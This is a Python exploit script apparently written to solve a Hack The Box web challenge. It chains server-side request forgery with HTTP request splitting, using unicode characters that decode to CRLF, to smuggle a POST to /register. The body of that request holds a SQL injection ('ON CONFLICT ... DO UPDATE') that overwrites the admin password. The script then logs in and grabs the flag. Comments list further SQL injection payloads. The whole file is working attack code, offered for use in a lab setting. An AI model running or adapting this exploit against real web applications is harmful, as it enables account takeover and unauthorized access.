#!/usr/bin/env python3

import requests
import json
import re

# weird how this is actually categorized as "easy" on HTB, I mean its nothing that hard, especially once you have the whole picture, but its definitely not an "easy" one lol, can't wait to try out the hard/insane ones
# not every beginner knows about SSRFs and HTTP response splitting, not to mention a combination of the 2 + unicode encoding to bypass the 127.0.0.1 check and then perform some sort of SQLi to change admin's password through a ON CONFLICT query like come on HTB :) you really need to redefine what "easy" and "beginner" mean in your book
# btw, I've tried more than a few payloads and only the ON CONFLICT worked for me which I actually didn't know about until this challenge, could've made it a bit easier through a normal ";UPDATE users set password='whatever' where username='admin';-- -" query
# "easy" would've been something like for example directory bruteforce the webapp, find /register, perform an easy SQLi like "' or 1=1-- -", get logged in and find the flag
# ANYWAY, enjoy the exploit hax0r xD

host = "159.65.26.210:32683" # CHANGE ME
username = "admin"
pwd = "pwned" # CHANGE ME IF YOU WANT TO LOL
password = f"') on conflict (username) do update set password='{pwd}';--".replace(" ","\u0120").replace("'", "%27")
api = "http://" + host + "/api/weather"
login = "http://" + host + "/login"
headers = {"Content-Type":"application/json"}

# \u0120 -> space
# \u010D -> \r
# \u010A -> \n
# https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/

for i in range(50):
  # the sqli didnt work for me when it came to setting the content-length of the post request to /register, for some reason it doesnt like len(username=admin&password=pwned), tried to count some bytes for a while but couldnt figure it out so I let it go and just looped through until I got it right
  content_length = str(len(username) + len(password) + i) 
  print(f"Trying length: {content_length}", end="\r")

  data = {"endpoint":"127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120" + content_length + "\u010D\u010A\u010D\u010Ausername=" + username + "&password=" + password + "\u010D\u010A\u010D\u010AGET\u0120","city":"Nuremberg","country":"DE"}

  try:
    r1 = requests.post(api, data=json.dumps(data), headers=headers, timeout=1)
    if "error" in r1.text:
      print(f"[+] Successfully changed admin's password to '{pwd}'!")
      data = f"username=admin&password={pwd}"
      headers = {"Content-Type":"application/x-www-form-urlencoded"}
      r2 = requests.post(login, headers=headers, data=data)
      flag = re.search("HTB{.*", r2.text)
      print("[+] Here's your flag: " + flag.group(0))
      break
  except requests.exceptions.ReadTimeout:
    continue
